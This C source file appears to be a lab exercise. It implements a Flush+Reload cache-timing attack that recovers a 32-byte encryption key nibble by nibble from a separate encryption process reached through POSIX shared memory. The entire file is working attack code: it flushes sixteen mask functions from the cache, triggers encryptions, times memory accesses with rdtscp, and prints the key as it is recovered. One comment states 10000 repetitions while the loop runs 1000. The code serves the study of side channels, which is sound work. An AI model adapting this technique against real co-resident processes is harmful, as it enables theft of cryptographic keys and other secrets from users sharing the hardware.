#include "crypto.h"
#include <x86intrin.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
int no_opt;

int access_time(void* address) {
    // Make sure all memory accesses before our own are completed
    _mm_mfence();
    // Sample time before
    unsigned int throwaway;
    unsigned long clocks_before = __rdtscp(&throwaway);
    // Make the memory access
    no_opt ^= *(int*)address;
    // Make sure the memory access completes
    _mm_lfence();
    // Sample time after
    unsigned long clocks_after = __rdtscp(&throwaway);

    return (int)(clocks_after - clocks_before);
}

void encrypt(char* shared_memory, char* text) {
    
    shared_memory[1] = 0;
    memcpy(shared_memory+1, text, strlen(text));
    memcpy(shared_memory, "1", 1);

    // Wait for the oracle to finish
    while(1) {
        if(*shared_memory == 0) {
            break;
        }
    }

    for(int i = 1; i < 17; i++) {
        no_opt ^= shared_memory[i];
    }
}

void flush_all() {
    _mm_clflush((void*)mask_0);
    _mm_clflush((void*)mask_1);
    _mm_clflush((void*)mask_2);
    _mm_clflush((void*)mask_3);
    _mm_clflush((void*)mask_4);
    _mm_clflush((void*)mask_5);
    _mm_clflush((void*)mask_6);
    _mm_clflush((void*)mask_7);
    _mm_clflush((void*)mask_8);
    _mm_clflush((void*)mask_9);
    _mm_clflush((void*)mask_10);
    _mm_clflush((void*)mask_11);
    _mm_clflush((void*)mask_12);
    _mm_clflush((void*)mask_13);
    _mm_clflush((void*)mask_14);
    _mm_clflush((void*)mask_15);
    _mm_mfence();
}

int main() {

    no_opt = 0;

    // Create shared memory for communication
    int shared_memory_descriptor = shm_open(
        "/encryption_shared_memory",
        O_RDWR | O_CREAT,
        S_IRUSR | S_IWUSR
    );
    if(shared_memory_descriptor < 0) {
        printf("Error creating shared memory object: %d\n", errno);
        exit(EXIT_FAILURE);
    }
    printf("Created shared memory descriptor\n");

    // The initial size will be 0, set the size to 32 bytes instead
    if(ftruncate(shared_memory_descriptor, 32) < 0) {
        printf("Error setting shared memory object size: %d\n", errno);
        exit(EXIT_FAILURE);
    }
    printf("Truncated shared memory descriptor\n");

    // Map the shared memory into this address space
    char* shared_memory = mmap(
        NULL,
        32,
        PROT_READ | PROT_WRITE,
        MAP_SHARED,
        shared_memory_descriptor,
        0
    );
    if(shared_memory == NULL) {
        printf("Error mapping shared memory: %d\n", errno);
        exit(EXIT_FAILURE);
    }
    printf("Mapped shared memory descriptor\n");

    // For each nibble in the 32 byte key
    char letter = 0;
    for(int i = 0; i < 64; i++) {

        int times[16] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

        // Repeat the measurement 10000 times
        for(int k = 0; k < 1000; k++) {
            
            // Get to the nibble we want
            int j = 0;
            for(j = 0; j < i; j++) {
                encrypt(shared_memory, "Hello");
            }
            
            // Flush all of the functions from the cache
            flush_all();

            // Encrypt, forcing the host to bring one of the mask functions into
            // the cache.
            j++;
            encrypt(shared_memory, "Hello");

            // Time accesses to the functions
            
            for(int l = 0; l < 16; l++) {
                switch(l) {
                    case 0: times[15] += access_time((void*)mask_15); break;
                    case 1: times[7] += access_time((void*)mask_7); break;
                    case 2: times[9] += access_time((void*)mask_9); break;
                    case 3: times[6] += access_time((void*)mask_6); break;
                    case 4: times[13] += access_time((void*)mask_13); break;
                    case 5: times[10] += access_time((void*)mask_10); break;
                    case 6: times[5] += access_time((void*)mask_5); break;
                    case 7: times[14] += access_time((void*)mask_14); break;
                    case 8: times[12] += access_time((void*)mask_12); break;
                    case 9: times[4] += access_time((void*)mask_4); break;
                    case 10: times[11] += access_time((void*)mask_11); break;
                    case 11: times[1] += access_time((void*)mask_1); break;
                    case 12: times[3] += access_time((void*)mask_3); break;
                    case 13: times[8] += access_time((void*)mask_8); break;
                    case 14: times[2] += access_time((void*)mask_2); break;
                    case 15: times[0] += access_time((void*)mask_0); break;
                    default: times[0] += access_time((void*)mask_0);
                }
                /*
                switch(l) {
                    case 0: times[0] += access_time((void*)mask_0); break;
                    case 1: times[1] += access_time((void*)mask_1); break;
                    case 2: times[2] += access_time((void*)mask_2); break;
                    case 3: times[3] += access_time((void*)mask_3); break;
                    case 4: times[4] += access_time((void*)mask_4); break;
                    case 5: times[5] += access_time((void*)mask_5); break;
                    case 6: times[6] += access_time((void*)mask_6); break;
                    case 7: times[7] += access_time((void*)mask_7); break;
                    case 8: times[8] += access_time((void*)mask_8); break;
                    case 9: times[9] += access_time((void*)mask_9); break;
                    case 10: times[10] += access_time((void*)mask_10); break;
                    case 11: times[11] += access_time((void*)mask_11); break;
                    case 12: times[12] += access_time((void*)mask_12); break;
                    case 13: times[13] += access_time((void*)mask_13); break;
                    case 14: times[14] += access_time((void*)mask_14); break;
                    case 15: times[15] += access_time((void*)mask_15); break;
                    default: times[0] += access_time((void*)mask_0);
                }
                */
            }

            // Skip the remaining nibbles
            for(; j < 64; j++) {
                encrypt(shared_memory, "Hello");
            }
        }

        // Find the minimum time
        int min_nibble = 0;
        int min_val = -1;
        for(int k = 0; k < 16; k++) {
            if(times[k] < min_val || min_val == -1) {
                min_val = times[k];
                min_nibble = k;
            }
        }

        if(i % 2 == 0) {
            letter = min_nibble << 4;
        } else {
            letter |= min_nibble;
            printf("%c", letter);
            fflush(stdout);
        }
    }
    printf("\n");

    return 0;
}